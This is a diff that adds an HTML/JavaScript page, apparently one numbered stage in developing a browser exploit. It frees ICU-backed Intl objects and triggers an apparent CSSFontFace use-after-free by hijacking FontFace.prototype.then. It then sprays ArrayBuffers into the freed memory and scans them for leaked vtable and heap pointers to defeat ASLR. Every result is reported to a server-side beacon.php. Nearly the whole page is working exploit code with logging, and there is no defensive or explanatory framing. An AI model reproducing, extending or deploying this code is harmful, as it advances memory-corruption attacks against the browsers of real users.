@@ -1,0 +1,254 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1143</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1143: INTL/ICU + MISC VTABLE HUNT ===');
+log('info','ICU objects (via Intl) use uprv_malloc -> possibly general heap');
+log('info','ICU uses virtual dispatch -> vtable pointers = code addresses');
+log('info','Also testing: TextEncoder, URL, Blob, XHR internals');
+B('P1143-START','t='+Date.now());
+
+// ===== PHASE A: Create many objects with internal C++ heap allocations =====
+
+// A1: Intl.NumberFormat (creates UNumberFormat via ICU)
+var intlNF=[];
+var locales=['en-US','de-DE','ja-JP','zh-CN','ar-SA','ko-KR','fr-FR','pt-BR','ru-RU','hi-IN'];
+try{
+  for(var i=0;i<100;i++){
+    intlNF.push(new Intl.NumberFormat(locales[i%10],{
+      style:i%3===0?'currency':i%3===1?'percent':'decimal',
+      currency:i%3===0?'USD':undefined,
+      minimumFractionDigits:i%4,
+      maximumFractionDigits:i%4+2
+    }));
+  }
+  log('ok','Created '+intlNF.length+' Intl.NumberFormat objects');
+}catch(e){log('fail','NumberFormat: '+e.message);}
+
+// A2: Intl.DateTimeFormat (creates UDateFormat via ICU)
+var intlDTF=[];
+try{
+  for(var i=0;i<80;i++){
+    intlDTF.push(new Intl.DateTimeFormat(locales[i%10],{
+      dateStyle:['full','long','medium','short'][i%4],
+      timeStyle:['full','long','medium','short'][(i+1)%4]
+    }));
+  }
+  log('ok','Created '+intlDTF.length+' Intl.DateTimeFormat objects');
+}catch(e){log('fail','DateTimeFormat: '+e.message);}
+
+// A3: Intl.Collator (creates UCollator via ICU)
+var intlCol=[];
+try{
+  for(var i=0;i<80;i++){
+    intlCol.push(new Intl.Collator(locales[i%10],{
+      sensitivity:['base','accent','case','variant'][i%4],
+      numeric:i%2===0
+    }));
+  }
+  log('ok','Created '+intlCol.length+' Intl.Collator objects');
+}catch(e){log('fail','Collator: '+e.message);}
+
+// A4: TextDecoder objects (create ICU converter internally)
+var textDecs=[];
+try{
+  var encodings=['utf-8','utf-16le','utf-16be','iso-8859-1','windows-1252',
+                 'euc-jp','shift_jis','euc-kr','gb2312','big5'];
+  for(var i=0;i<60;i++){
+    try{textDecs.push(new TextDecoder(encodings[i%10]));}catch(e2){}
+  }
+  log('ok','Created '+textDecs.length+' TextDecoder objects');
+}catch(e){log('fail','TextDecoder: '+e.message);}
+
+// A5: URL objects (internal WHATWG URL parser state)
+var urls=[];
+try{
+  for(var i=0;i<100;i++){
+    urls.push(new URL('https://example'+i+'.com:'+((i*7+1024)%65535)+'/path/to/page?q='+i+'&r='+Math.random()+'#frag'+i));
+  }
+  log('ok','Created '+urls.length+' URL objects');
+}catch(e){log('fail','URL: '+e.message);}
+
+// A6: Blob objects (internal data buffer)
+var blobs=[];
+try{
+  for(var i=0;i<60;i++){
+    var data='';
+    for(var j=0;j<(50+i*3);j++) data+=String.fromCharCode(32+((i*7+j)%95));
+    blobs.push(new Blob([data],{type:'text/plain'}));
+  }
+  log('ok','Created '+blobs.length+' Blob objects');
+}catch(e){log('fail','Blob: '+e.message);}
+
+B('P1143-CREATED','nf='+intlNF.length+'|dtf='+intlDTF.length+'|col='+intlCol.length+
+  '|td='+textDecs.length+'|url='+urls.length+'|blob='+blobs.length);
+
+// ===== PHASE B: Exercise objects (ensure internal C++ state is fully initialized) =====
+try{
+  for(var i=0;i<intlNF.length;i++) intlNF[i].format(12345.678);
+  for(var i=0;i<intlDTF.length;i++) intlDTF[i].format(new Date());
+  for(var i=0;i<intlCol.length;i++) intlCol[i].compare('abc','def');
+}catch(e){}
+log('ok','Exercised all Intl objects');
+
+// ===== PHASE C: Null everything, force GC =====
+log('info','Freeing all objects...');
+for(var i=0;i<intlNF.length;i++) intlNF[i]=null;intlNF=null;
+for(var i=0;i<intlDTF.length;i++) intlDTF[i]=null;intlDTF=null;
+for(var i=0;i<intlCol.length;i++) intlCol[i]=null;intlCol=null;
+for(var i=0;i<textDecs.length;i++) textDecs[i]=null;textDecs=null;
+for(var i=0;i<urls.length;i++) urls[i]=null;urls=null;
+for(var i=0;i<blobs.length;i++) blobs[i]=null;blobs=null;
+
+// Force GC pressure
+log('info','GC pressure...');
+for(var gc=0;gc<20;gc++){
+  var trash=[];
+  for(var i=0;i<5000;i++) trash.push(new ArrayBuffer(128));
+  trash=null;
+}
+log('ok','GC pressure done');
+
+// ===== PHASE D: CSSFontFace UAF + spray =====
+var r=Date.now()%100000;
+var uafHit=false;
+var allSpray={};
+// Wider size range for ICU objects (can be 100-2000 bytes)
+var SIZES=[32,48,64,80,96,112,128,160,192,224,256,320,384,512,640,768,1024];
+for(var si=0;si<SIZES.length;si++) allSpray[SIZES[si]]=[];
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:i"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('j'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+
+  // Spray at all sizes
+  var PER=45;
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<PER;k++){
+      allSpray[sz].push(new ArrayBuffer(sz));
+    }
+  }
+  try{document.fonts.check('1em i'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em j'+r+', i'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  // ===== PHASE E: Scan ALL buffers =====
+  log('phase','--- Scanning '+SIZES.length+' size classes ---');
+
+  var totalNZ=0;
+  var vtableHits=[];
+  var dataHits=[];
+  var cffFound=false;
+
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    var bufs=allSpray[sz];
+    var nzCount=0;
+
+    for(var k=0;k<bufs.length;k++){
+      var v=new BigUint64Array(bufs[k]);
+      var hasNZ=false;
+      for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
+      if(!hasNZ) continue;
+      nzCount++;
+
+      // Dump first 8 qwords
+      var dump=[];
+      for(var q=0;q<Math.min(v.length,8);q++) dump.push('q'+q+'='+hex64(v[q]));
+
+      var q0=v[0];
+      var q0hi=Number(q0>>32n);
+
+      // CSSFontFace identification
+      if(sz===192&&q0===1n&&v.length>11&&v[11]!==0n){
+        var h11=Number(v[11]>>32n);
+        if(h11>=0x10&&h11<=0xFF){
+          cffFound=true;
+          B('P1143-CFF','q11='+hex64(v[11])+'|q13='+hex64(v[13]));
+          log('ok','CSSFontFace: q11='+hex64(v[11]));
+          continue;
+        }
+      }
+
+      // Scan ALL qwords for interesting patterns
+      var codeQwords=[];
+      var heapQwords=[];
+      var smallQwords=[];
+      for(var q=0;q<v.length;q++){
+        var val=v[q];
+        if(val===0n) continue;
+        var hi=Number(val>>32n);
+        var lo=Number(val&0xFFFFFFFFn);
+
+        if(hi>=0x10&&hi<=0xFF) heapQwords.push(q);
+        else if(hi>=1&&hi<=0xF) codeQwords.push({q:q,val:hex64(val)});
+        else if(hi===0&&lo>=0x100000&&lo<=0xFFFFFFFF) codeQwords.push({q:q,val:hex64(val)});
+        else if(val>0n&&val<0x10000n) smallQwords.push(q);
+      }
+
+      // Report
+      var hit={sz:sz,k:k,q0:hex64(q0),nzQ:0,
+        code:codeQwords.length,heap:heapQwords.length,small:smallQwords.length};
+      for(var q=0;q<v.length;q++){if(v[q]!==0n)hit.nzQ++;}
+
+      if(codeQwords.length>0){
+        vtableHits.push(hit);
+        log('win','CODE PTR! sz='+sz+' k='+k+' codePtrs='+codeQwords.length);
+        for(var ci=0;ci<Math.min(codeQwords.length,5);ci++){
+          log('win','  q'+codeQwords[ci].q+'='+codeQwords[ci].val);
+        }
+        log('ptr','  '+dump.join(' '));
+        B('P1143-CODE-'+sz+'-'+k,JSON.stringify(codeQwords.slice(0,5))+'|'+dump.slice(0,4).join('|'));
+      }else{
+        dataHits.push(hit);
+        log('info','Data: sz='+sz+' k='+k+' nzQ='+hit.nzQ+' heap='+heapQwords.length);
+        if(nzCount<=2) B('P1143-DATA-'+sz+'-'+k,dump.join('|'));
+      }
+    }
+
+    if(nzCount>0){
+      totalNZ+=nzCount;
+      B('P1143-SZ-'+sz,'nz='+nzCount+'/'+bufs.length);
+    }
+  }
+
+  // Summary
+  B('P1143-VTABLE','count='+vtableHits.length);
+  for(var i=0;i<Math.min(vtableHits.length,8);i++){
+    B('P1143-VT-'+i,JSON.stringify(vtableHits[i]));
+  }
+  B('P1143-DATA','count='+dataHits.length);
+
+  var summary='total_nz='+totalNZ+'|code='+vtableHits.length+
+    '|data='+dataHits.length+'|cff='+cffFound;
+  B('P1143-DONE',summary);
+  log('phase','=== DONE: '+totalNZ+' non-zero, '+vtableHits.length+' code ptr hits ===');
+
+  if(vtableHits.length>0){
+    log('win','!!! CODE POINTERS FOUND - ASLR DEFEAT POSSIBLE !!!');
+  }else if(dataHits.length>0){
+    log('info','Non-code data found. ICU objects reached general heap but no code ptrs at expected offsets.');
+  }else{
+    log('fail','Only CSSFontFace. ICU objects likely GC-prevented or uprv_malloc != fastMalloc.');
+  }
+},25);
+</script></body></html>
